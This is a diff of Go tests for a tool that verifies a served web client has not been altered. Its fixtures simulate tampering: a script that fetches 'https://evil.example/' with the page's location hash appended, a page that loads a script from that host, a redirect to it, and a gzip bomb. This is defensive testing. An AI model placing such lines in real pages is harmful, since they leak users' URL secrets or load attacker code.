@@ -45,6 +45,26 @@ func gunzipBytes(t *testing.T, data []byte) []byte {
 	return plain
 }
 
+func unavailable(path string, wrap func(http.Handler) http.Handler) func(http.Handler) http.Handler {
+	return func(next http.Handler) http.Handler {
+		wrapped := wrap(next)
+		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+			if r.URL.Path == path {
+				http.Error(w, "unavailable", http.StatusServiceUnavailable)
+				return
+			}
+			wrapped.ServeHTTP(w, r)
+		})
+	}
+}
+
+func changedScript() func(http.Handler) http.Handler {
+	return rewrite(pathIs("/assets/index-a1.js"), func(response *served) {
+		response.body = []byte("fetch('https://evil.example/'+location.hash)")
+		response.header.Del("Content-Encoding")
+	})
+}
+
 func gzipBytes(t *testing.T, data []byte) []byte {
 	t.Helper()
 	var out bytes.Buffer
@@ -311,17 +331,28 @@ func TestVerifyClientRefusesAChangedClient(t *testing.T) {
 			response.body = bytes.Repeat([]byte{'a'}, 2<<20)
 			response.header.Del("Content-Encoding")
 		}), "/terms: client: the server sent a malformed response"},
-		{"unreadable operator contact beside a changed file", func(next http.Handler) http.Handler {
-			contact := rewrite(pathIs(server.TransparencyPath), func(response *served) {
-				response.body = []byte("{")
-				response.header.Del("Content-Encoding")
-			})
-			file := rewrite(pathIs("/assets/index-a1.js"), func(response *served) {
-				response.body = []byte("fetch('https://evil.example/'+location.hash)")
-				response.header.Del("Content-Encoding")
-			})
-			return contact(file(next))
+		{"malformed transparency document", rewrite(pathIs(server.TransparencyPath), func(response *served) {
+			response.body = []byte("{")
+			response.header.Del("Content-Encoding")
+		}), server.TransparencyPath + ": the transparency document is not valid JSON"},
+		{"transparency unavailable beside a changed page", unavailable(server.TransparencyPath, rewrite(pathIs("/terms"), func(response *served) {
+			response.body = []byte("<!doctype html><script src=https://evil.example/x.js></script>")
+			response.header.Del("Content-Encoding")
+		})), "/terms: the page differs"},
+		{"failing page beside a changed file", unavailable("/terms", changedScript()), "/assets/index-a1.js: the file differs"},
+		{"proxy header on a page beside a changed file", func(next http.Handler) http.Handler {
+			header := rewrite(pathIs("/"), func(response *served) { response.header.Set("X-Unlisted-Proxy", "1") })
+			return header(changedScript()(next))
 		}, "/assets/index-a1.js: the file differs"},
+		{"redirect to another site", func(next http.Handler) http.Handler {
+			return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+				if r.URL.Path == "/terms" {
+					http.Redirect(w, r, "https://evil.example/", http.StatusFound)
+					return
+				}
+				next.ServeHTTP(w, r)
+			})
+		}, "redirect"},
 		{"gzip bomb", rewrite(browserAsks("/assets/index-a1.js"), func(response *served) {
 			response.body = gzipBytes(t, bytes.Repeat([]byte{'a'}, 16<<20))
 			response.header.Set("Content-Encoding", "gzip")
@@ -414,6 +445,13 @@ func TestVerifyClientAcceptsAllowedProxyHeaders(t *testing.T) {
 	}
 	if result := runVerify(t, url, files, "--allow-header", "cf-ray"); result.code != command.ExitOK {
 		t.Fatalf("an allowed proxy header must pass: %+v", result)
+	}
+	for _, path := range []string{"/", "/assets/style-b2.css"} {
+		only := rewrite(pathIs(path), func(response *served) { response.header.Set("Cf-Ray", "8f0e") })
+		result := runVerify(t, newWebTestServer(t, files, "test", only), files)
+		if result.code != command.ExitError || !strings.Contains(result.stderr, "the server sent the Cf-Ray header") {
+			t.Fatalf("an unknown proxy header on %s alone must fail: %+v", path, result)
+		}
 	}
 	for _, name := range []string{"Refresh", "set-cookie", "NEL", "Link", "Speculation-Rules"} {
 		if result := runVerify(t, url, files, "--allow-header", name); result.code != command.ExitUsage {
